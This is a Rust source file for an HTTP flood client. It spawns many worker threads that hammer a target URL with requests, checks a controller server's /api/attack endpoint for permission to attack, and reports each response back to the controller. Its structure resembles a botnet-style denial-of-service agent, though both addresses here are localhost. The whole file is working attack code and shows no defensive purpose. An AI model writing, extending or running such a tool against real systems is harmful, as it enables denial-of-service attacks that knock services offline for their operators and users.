use serde_json;
use std::sync::{Arc, Mutex};
use serde_json::Value;

struct Client {
    host_address: String,
    address: String,
    attacking: bool,
    workers: Vec<Arc<Mutex<Worker>>>,
    worker_threads: Vec<std::thread::JoinHandle<()>>,

}

struct Worker {
    host_address: String,
    attacking: bool,
    address: String,
    client: reqwest::blocking::Client,
}

impl Worker {
    fn new(addr: String, host: String) -> Worker {
        let client = reqwest::blocking::Client::new();
        let mut add = host.clone();
        add.push_str("/attack_info");
        Worker {host_address: add, attacking: true, address: addr, client }
    }
    fn start_requesting(&self) -> i32{
        if self.attacking {
            let to_attack = self.address.as_str();
            let res = self.client.get(to_attack).send().unwrap();
            let code = res.status().as_u16();
            let body = res.text().unwrap();
            let response_body = serde_json::json!({"code": code, "body":body});
            println!("{}", response_body);
            self.client.post(self.host_address.as_str()).json(&response_body).send().unwrap();
            return 0;
        }
    1
    }
}

impl Client {
    fn new(host: String, addr: String) -> Client {
        let mut cl = Client { host_address: host, address: addr, attacking: false, workers: vec![], worker_threads: vec![] };
        let thread_count = (std::thread::available_parallelism().unwrap().get())*4;
        cl.worker_threads.reserve(thread_count);
        for _ in 0..thread_count {
            cl.workers.push(Arc::new(Mutex::new(
                Worker::new(cl.address.clone(), cl.host_address.clone()))));
        }
        cl.host_address.push_str("/api/attack");
        return cl;
    }

    fn can_attack(&mut self) {
        let url = self.host_address.as_str();
        let req = reqwest::blocking::get(url).unwrap().text().unwrap();
        if req == String::from("true") {
            self.attacking = true;
            for elem in self.workers.iter_mut() {
                let mut worker = elem.lock().unwrap();
                worker.attacking = true;
            }
        } else {
            self.attacking = false;
            for elem in self.workers.iter_mut() {
                let mut worker = elem.lock().unwrap();
                worker.attacking = false;
            }
        }
    }

    fn thread_worker(worker: Arc<Mutex<Worker>>){
        loop {
            let w = worker.lock().unwrap();
            println!("{}", w.attacking);
            let mut _r = 0;
            for _ in 0..20 {
                _r = w.start_requesting();
            }
        }
    }

    fn run(mut self) {
        let max_size = self.workers.capacity();
        let mut i = 0;
        while i < max_size {
            let ind = i.to_owned().clone();
            let worker = self.workers[ind].clone();
            self.worker_threads.push(std::thread::spawn(move || {
                Client::thread_worker(worker);
            }));
            i += 1;
        }
        let mut fail_count: u32 = 0;
        loop {
            let mut j = 0;
            while j < 20 {
                if self.attacking {
                    let _ = reqwest::blocking::get(self.address.to_owned().as_str());
                }
                j += 1;
            }
            self.can_attack();
            if !self.attacking {
                fail_count += 1;
            } else {
                fail_count = 0;
            }
            if fail_count == 5 {
                break;
            }
        }
        while self.worker_threads.len()>0 {
            let thread= self.worker_threads.pop().unwrap();
            thread.join().unwrap();
        }
    }
}


fn main() {
    let cl = Client::new(String::from("http://localhost:8080"),
                         String::from("http://localhost:8000"));
    cl.run();
}
